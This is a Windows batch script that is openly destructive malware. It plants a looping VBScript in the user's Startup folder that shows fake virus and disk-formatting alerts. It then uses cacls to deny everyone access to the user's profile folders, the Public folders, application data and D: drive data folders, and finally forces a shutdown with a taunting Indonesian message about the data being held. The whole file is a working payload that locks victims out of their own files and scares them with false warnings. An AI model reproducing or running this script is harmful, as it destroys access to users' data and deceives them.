@echo off
cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
@echo off
echo Do >>Error.vbs
echo Msgbox "Your computer has been infected by a virus",16,"Warning !" >>Error.vbs
echo dim x,yes,no >>Error.vbs
echo x=Msgbox("Virus has infected hard drive (C:). Deletion of the virus will require complete formatting of hard drive (C:). Would you like to format hard drive (C:) ?",52,"Warning !") >>Error.vbs
echo if x=6 then >>Error.vbs
echo dim box >>Error.vbs
echo box=Msgbox("Hard drive (C:) formatting complete. In order to function correctly your computer must restart, would you like to restart now ?",36,"Formatting has been completed") >>Error.vbs
echo if box=6 then >>Error.vbs
echo Msgbox "Fatal error, code 08x48631643.B-7",16,"ERROR" >>Error.vbs
echo Msgbox "code 09x48631643.B-7",64,"System" >>Error.vbs
echo end if >>Error.vbs
echo if box=7 then >>Error.vbs
echo Msgbox "Fatal error, code 08x48631643.B-7",16,"ERROR" >>Error.vbs
echo Msgbox "48631643.B-7",64,"System" >>Error.vbs
echo end if >>Error.vbs
echo end if >>Error.vbs
echo if x=7 then >>Error.vbs
echo Msgbox "Fatal error, code 08x48631643.B-7",16,"ERROR" >>Error.vbs
echo Msgbox "48631643.B-7",64,"System" >>Error.vbs
echo end if >>Error.vbs
echo loop >>Error.vbs
:::::::::::::::::::::::::::::::::::::::::::::::::
cd "C:\Users\
@cacls %username% /e /p everyone:n
@cacls Public /e /p everyone:n
::::::::::::::::::::::::::::::::::::::::::::::::
cd "C:\Users\%username%
@cacls AppData /e /p everyone:n
@cacls Pictures /e /p everyone:n
@cacls Videos /e /p everyone:n
@cacls Downloads /e /p everyone:n
@cacls Desktop /e /p everyone:n
@cacls Documents /e /p everyone:n
:::::::::::::::::::::::::::::::::::::::::::::::::::
cd "C:\Users\%username%AppData
@cacls Roaming /e /p everyone:n
@cacls Local /e /p everyone:n
@cacls LocalLow /e /p everyone:n
::::::::::::::::::::::::::::::::::::::::::::::::::::::
cd "C:\Users\Public
@cacls Documents /e /p everyone:n
@cacls Downloads /e /p everyone:n
@cacls Favorites /e /p everyone:n
@cacls Libraries /e /p everyone:n
@cacls Music /e /p everyone:n
@cacls Pictures /e /p everyone:n
@cacls Videos /e /p everyone:n
:::::::::::::::::::::::::::::::::::::::::::::::::::
cd "C:\Users\%username%\AppData\Roaming
@cacls Microsoft /e /p everyone:n
@cacls Mozilla /e /p everyone:n
:::::::::::::::::::::::::::::::::::::::::::::::::::
cd "C:\Users\%username%\AppData\Roaming\Microsoft
@cacls Windows /e /p everyone:n
@cacls OfficeTamplates /e /p everyone:n
@cacls Internet ExplorerPowerPoint /e /p everyone:n
@cacls Network /e /p everyone:n
@cacls Exel /e /p everyone:n
@cacls Word /e /p everyone:n
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows
@cacls Start Menu /e /p everyone:n
@cacls Libraries /e /p everyone:n
@cacls Recent /e /p everyone:n
@cacls Themes /e /p everyone:n
@cacls Templates /e /p everyone:n
:::::::::::::::::::::::::::::::::::::::::::::::::::::::
cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu
@cacls Programs /e /p everyone:n
:::::::::::::::::::::::::::::::::::::::::::::::::::::::
cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
@cacls Accessories /e /p everyone:n
@cacls WinRAR /e /p everyone:n
@cacls Startup /e /p everyone:n
:::::::::::::::::::::::::::::::::::::::::::::::::::::
cd "D:\
@cacls Documents /e /p everyone:n
@cacls Music /e /p everyone:n
@cacls Videos /e /p everyone:n
@cacls Pictures /e /p everyone:n
@cacls data /e /p everyone:n 
::::::::::::::::::::::::::::::::::::::::::::::::::
@shutdown /s /c "Mantep Gan,Data Tersandra wkwk"
